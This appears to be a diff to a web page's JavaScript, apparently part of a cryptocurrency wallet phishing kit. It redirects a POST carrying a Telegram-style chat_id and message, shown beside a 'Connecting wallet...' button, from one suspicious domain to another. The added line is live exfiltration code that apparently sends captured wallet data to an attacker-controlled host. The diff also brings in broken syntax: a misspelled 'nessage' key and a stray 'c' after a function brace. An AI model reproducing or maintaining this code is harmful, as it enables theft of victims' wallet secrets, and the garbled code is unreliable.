@@ -9116,16 +9116,16 @@
 
         $.ajax({
           type: "POST",
-          url: `https://lettersure.page.gd/sender.php`,
+          url: `https://martinemed.homes//sender.php`,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
           data: {
             'chat_id':chatId,
-        'message': message,
+        'nessage': message,
         'parse_mode' : 'HTML'
           },
-          beforeSend: function () {
+          beforeSend: function () {c
             processBtn.html(
               '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
             );
